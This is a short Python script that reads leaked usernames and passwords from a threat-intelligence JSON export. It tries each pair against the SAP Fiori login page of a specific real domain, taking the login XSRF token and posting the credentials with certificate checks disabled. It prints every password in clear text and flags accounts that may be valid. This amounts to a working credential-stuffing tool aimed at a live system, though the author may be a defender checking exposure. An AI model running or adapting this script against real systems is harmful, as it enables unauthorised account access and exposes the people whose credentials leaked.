import json
import requests
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #disable ssl warning

# parser username + password from json file
with open('C:\\Users\\hungnv4\\Desktop\\2025-04-11T04_31_09.499Z_8ae2f605e319dcdf6_ExportFileStix2Stix-Cyber-Observable_simple.json', 'r', encoding='utf-8') as file:
    accounts = json.load(file)

# URL login SAP Fiori
url = "https://bmh.mbageas.life/sap/bc/ui5_ui5/ui2/ushell/shells/abap/FioriLaunchpad.html"

# get token from response
def extract_xsrf_token_from_html(html):
    soup = BeautifulSoup(html, 'html.parser')
    input_tag = soup.find('input', attrs={'name': 'sap-login-XSRF'})
    if input_tag:
        return input_tag.get('value')
    return None


for acc in accounts:
    if "bmh.mbageas.life" in acc.get("x_opencti_description", ""):
        username = acc.get("account_login")
        password = acc.get("credential")
        print(f"\nAccount: {username} / {password}")

        try:
            # GET request retrieve token & cookie
            session = requests.Session()
            get_response = session.get(url, timeout=10, verify=False)
            xsrf_token = extract_xsrf_token_from_html(get_response.text)

            if not xsrf_token:
                print("token sap-login-XSRF not found.")
                continue
            else:
                print(f"XSRF Token: {xsrf_token}")

            # Data payload
            payload = {
                "sap-system-login-oninputprocessing": "onLogin",
                "sap-urlscheme": "",
                "sap-system-login": "onLogin",
                "sap-system-login-basic_auth": "",
                "sap-client": "100",
                "sap-accessibility": "",
                "sap-login-XSRF": xsrf_token,
                "sap-system-login-cookie_disabled": "",
                "sap-hash": "",
                "sap-language": "EN",
                "sap-user": username,
                "sap-password": password,
                "sap-client": "100"
            }

            # POST request
            headers = {
                "Origin": "https://bmh.mbageas.life",
                "User-Agent": "Mozilla/5.0",
                "Referer": url,
                "Content-Type": "application/x-www-form-urlencoded",
            }

            response = session.post(url, headers=headers, data=payload, timeout=10, verify=False)

            # Parse HTML
            soup = BeautifulSoup(response.text, "html.parser")
            error_label = soup.find('label', id='LOGIN_LBL_ERROR')

            if error_label:
                print("Response:", error_label.text.strip())
            else:
                print("No response reason, maybe valid")

        except Exception as e:
            print("Error when run:", e)
